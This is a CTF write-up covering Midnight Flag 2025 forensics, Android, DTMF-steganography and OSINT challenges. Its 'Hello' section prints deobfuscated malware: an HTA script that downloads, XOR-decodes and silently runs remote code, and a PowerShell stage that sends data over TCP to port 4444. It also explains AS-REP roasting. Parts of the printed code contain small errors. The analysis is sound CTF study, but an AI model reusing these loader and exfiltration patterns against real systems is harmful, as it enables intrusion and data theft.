---
title: Write-up Midnight Flag CTF 2025
published: 2025-04-22
description: Write-up Midnight Flag CTF 2025
tags: [write-up, ctf, forensic, osint, steganography]
image: /images/midnightflag_2025/logo_ctf.png
category: Write-Ups
draft: false
---

# Summary

- [Forensic - Hello](#hello)
- [Forensic - Empire Sous Frozen](#empire-sous-frozen)
- [Android - Baby neo password](#baby-neo-password)
- [Steganography - Tonalizer](#tonalizer)
- [Osint - Nightcity Ripperdoc](#nightcity-ripperdoc)
- [Osint - Nightcity Cyberpsycho](#nightcity-cyberpsycho)


---

# Forensic
## Hello

The HTML Application file (.hta) given contained Obfuscated JavaScript code.

Below the deobfuscated code :
```js
function XOR(bstring, key) {
	var res = "";
	for (var i = 0; i < bstring.length; i++) {
		res += String.fromCharCode(bstring.charCodeAt(i) ^ key);
	}
	return _0x5abc45;
}
  
var request = new ActiveXObject('MSXL2.XMLHXL');
request.open('GET', 'https://mctf.lamarr.bzh/CFcGFCGgn', false);
request.send();
if (request.status == 200) {
	var script = XOR(request.responseText, 66);
	new ActiveXObject('WScript.Shell').Run(script, 0, true);
} else {
	throw new Error(request.status)
};
```

As we can see, the content present at the URL `https://mctf.lamarr.bzh/CFcGFCGgn` xored with the number 66
can be run as a PowerShell script.

After xoring the content, we are in front of another obfuscated script, here is the deobfuscated version :
```powershell
$base64Encoded = "JHpGPVtUZXh0LkVuY29kaW5nXTo6VVRGODskcVc9W0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCJBRG9IZFJnOVVSSVlLakFIRjBNREdoSklabXdnSUZJVkxCZ3lVZ0lUVWhVM0F3cHFIZz09Iik7JGpSPSR6Ri5HZXRTdHJpbmcoJHFXKTskdEc9Ik15UzNjcjN0IjskckY9IiI7MC4uKCRqUi5MZW5ndGgtMSl8JXsgJHJGKz1bY2hhcl0oKFtpbnRdW2NoYXJdJGpSWyRfXSkgLWJ4b3IgKFtpbnRdW2NoYXJdJHRHWyRfJSR0Ry5MZW5ndGhdKSl9OyR5VD1OZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRjcENsaWVudCgiMTkyLjE2OC4xLjEwMCIsNDQ0NCk7JHBPPSR5VC5HZXRTdHJlYW0oKTskaUo9TmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJHBPKTskaUouV3JpdGUoJHJGKTskaUouRmx1c2goKTskeVQuQ2xvc2UoKTs="
$decodedBytes = [System.Convert]::FromBase64String($base64Encoded)
$decodedString = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
Invoke-Expression $decodedString
```

This script decodes the base64 encoded string present in the `base64Encoded` variable and executes it with the
`Invoke-Expression` Powershell primitive.

The base64 string is another obfuscated powershell, here is the (pseudo) deobfuscated version of the script :
```powershell
$zF=[Text.Encoding]::UTF8;
$qW=[Convert]::FromBase64String("ADoHdRg9URIYKjAHF0MDGhJIZmwgIFIVLBgyUgITUhU3AwpqHg==");
$jR=$zF.GetString($qW);
$tG="MyS3cr3t";
$rF="";
0..($jR.Length-1)|%{ $rF+=[har](([int][char]$jR[$_]) -bxor ([int][char]$tG[$_%$tG.Length]))};
$yT=New-Object Net.Sockets.TcpClient("192.168.1.100",4444);
$pO=$yT.GetStream();
$iJ=New-Object IO.StreamWriter($pO);
$iJ.Write($rF);
$iJ.Flush();
$yT.Close();
```

As we can guess, the string in the `rF` variable is sent over a TCP socket.

This string seems to be the result of a xor between the variable `jR`, which is the result of a decoded base64 string, and
the variable `tG` (== "MyS3cr3t").

```
base64_decode(ADoHdRg9URIYKjAHF0MDGhJIZmwgIFIVLBgyUgITUhU3AwpqHg) ^ "MyS3cr3t" -> "MCTF{ObfUSc4t10n_15_CRaaaaaaaaaazzYY}"
```

The flag is : `MCTF{ObfUSc4t10n_15_CRaaaaaaaaaazzYY}`

## Empire Sous Frozen

What we've got here are logs concerning Kerberos TGT (Ticket Granting Ticket) requests/responses.

The file seems a little noisy but what is important is :
* If the `Response ticket hash` equals `-`, the TGT wasn't granted to the user
* If the `Response ticket hash` has a value (basically a base64 encoded hash), the user was granted a TGT.

With this information, we can identify a wide area between line 1168 and 44260 where the TGT requests were unsuccessful.
This is either because :
* The queried user doesn't exist
* The user requires a password
* The password given was wrong.

Into the mentionned area, we can see two successful responses line 6718 and 7538 for the same user : `trooper`

Without knowing his password, the attacker managed to ask a TGT for the user because his `Pre-Authentication EncryptionType`
attribute was set to `0x0` (as we can see line 6710 or 7530).

This means the user doesn't require pre authentication. A TGT can be asked on its behalf without a password. This attack
is know as "ASREProasting".

The flag is : `MCTF{trooper:asreproasting}`

# Android
## Baby neo password

The application given in the challenge seems to send a notification with the flag.

As we can see in the file `sources/com/example/neopasswd/ui/notifications/NotificationsFragment.java`, the notification is hardcoded and xored with the
number 66.

```java
...
byte[] bArr = {15, 1, 22, 4, 57, 115, 54, 119, 29, 17, 55, 18, 113, 48, 29, 113, 35, 49, 59, 29, 54, 114, 29, 4, 115, 44, 38, 29, 17, 113, 33, 48, 39, 54, 119, 63};
...
private byte[] encryptNotification(byte[] toEncrypt) {
        byte[] encrypted = new byte[toEncrypt.length];
        for (int i = 0; i < encrypted.length; i++) {
            encrypted[i] = (byte) (toEncrypt[i] ^ 66);
        }
        return encrypted;
    }
```

:::note
XOR is a reversible operation : A^B == C implies A^C == B
:::

Here is a script to recover the notification and the flag :
```python
notif=[15, 1, 22, 4, 57, 115, 54, 119, 29, 17, 55, 18, 113, 48, 29, 113, 35, 49, 59, 29, 54, 114, 29, 4, 115, 44, 38, 29, 17, 113, 33, 48, 39, 54, 119, 63]

flag = ""

for i in notif:
	flag += chr(i^66)

print(flag)
```

The flag is : `MCTF{1t5_SuP3r_3asy_t0_F1nd_S3cret5}`

# Steganography
## Tonalizer

The `tonalizer.wav` contains what seems to be phone tonalities. Each sound correspond to the pression of a button between
1 to 9 as we can see below (image source : Wikipedia.org):

![phone touches](/images/midnightflag_2025/phone_touches.png)

In order to recognize which tonality is associated with each button, we can use the website : https://dtmf.netlify.app/

With a sensitivity threshold of 0.14, we obtain : `4444433336644466866666337777`

There is a little "problem" with a consecutive number of pression :
* if only one pression is done, there is one possibility (for the button 4 : [G])
* if two pression are done, there is 2 possibilities (for the button 4 : [GG, H])
* if three are done, there is 4 possibilities (for the button 4 : [GGG, GH, HG, I])
* ...

:::note
In the end, that makes 2^N possibilities with N the number of consecutive pression.
:::


The `866666337777` section is pretty straightforward :
```
8 == T
66666 == 666 66 == O N
33 == E
7777 == S

-> TONES (pretty accurate)
```

The rest was a bit trickier :

```
44444
GGGGG / GGGH / GHGG / GGHG / HGGG / GIG / IGG / GGI / IH / HI
-> HI
  
3333
DDDD / DDE / DED / EDD / EE / DF / FD
-> DDE
  
66
N / MM
-> N

-> HIDDEN
```
```
444
I / GGG / GH / HG / I
-> I  
IN
  
66
N / MM
-> N

-> IN
```

which makes `Hidden In Tones`

The flag is : `MCTF{HIDDENINTONES}`

# Osint
## NightCity Ripperdoc

Here is the picture given in the challenge :
![picture osint 1](/images/midnightflag_2025/osint_pic1.png)

As we can see, the picture was taken in front of some docks, facing 3 big structures. Also, there are mountains at our left in the background.

Searching on https://maps.piggyback.com/cyberpunk-2077/maps/night-city,
I was able to find this spot :
![interactive map spot](/images/midnightflag_2025/interactive_spot.png)

As you can see, we recognize the 3 big structure at the right. I marked
aproximatively the spot that I trust the picture was taken at.

Near this location, we can identify a ripperdoc and a bar :
* The doc : Cassius Ryder
* The bar : The Totentanz

The flag : `MCTF{Cassius_Ryder:Totentanz}`

## NightCity Cyberpsycho

Here is the picture given in the challenge :
![picture osint 2](/images/midnightflag_2025/osint_pic2.png)

On the picture we can see 3 interesting informations :


* A compass at the top left hand corner indicating the north
* The character will have to meet Hanako at the Embers, which is around 3,4km at what seems to be the south/south west  
* The cyberpsycho (the blue marker i guess) is 325 meter ahead

We can find a pretty accurate scale of what is a kilometer comparing
nightcity (source : https://www.reddit.com/r/cyberpunkgame/comments/1fj4f8b/printable_night_city_map_for_a3_paper/?tl=fr):
![scale map nigthcity](/images/midnightflag_2025/scale_map.png)

using the previous mentionned interactive map, we can find the location
of the Embers and draw a 3.4km circle with the Embers at the center.

![scale map with drawings](/images/midnightflag_2025/scale_map_draw.png)

Among the cyberpsychos present at the north, the closer to the line
is `Lely Hein`, the associated mission is `Six Feet Under`

The flag is : `MCTF{Six_Feet_Under:Lely_Hein}`

## I believe I can fly

The challenge gives us this image of a ski jump, the mission is to find
various informations related to it :
![picture osint 3](/images/midnightflag_2025/osint_pic3.png)

The given image can be looked up using google image :
![reverse search](/images/midnightflag_2025/google_reverse.png)

As we can see, that is the `Le grand tremplin de Lans En Vercors`. Also,
we are searching for an "international ski competition".

Therefore, a google query can lead us to all the necessary informations,
actually in the first link :
![google dork](/images/midnightflag_2025/google_dork.png)

The page : https://www.skisprungschanzen.com/EN/Ski+Jumps/FRA-France/V-Rhône-Alpes/Lans-en-Vercors/2600/

![website ski](/images/midnightflag_2025/website_ski.png)

* The ski jump was located at Lans-en-Vercors : `Lans_en_Vercors `
* The last recordman was Olav Ulland : `Olav_Ulland`
* The ski jump was inaugurated on "February 8, 1931" : `08-02-1931`
* The picture was showing the 20th international ski competition of Villard-de-Lans : `20`

The flag is : `MCTF{Lans_en_Vercors:Olav_Ulland:08-02-1931:20}`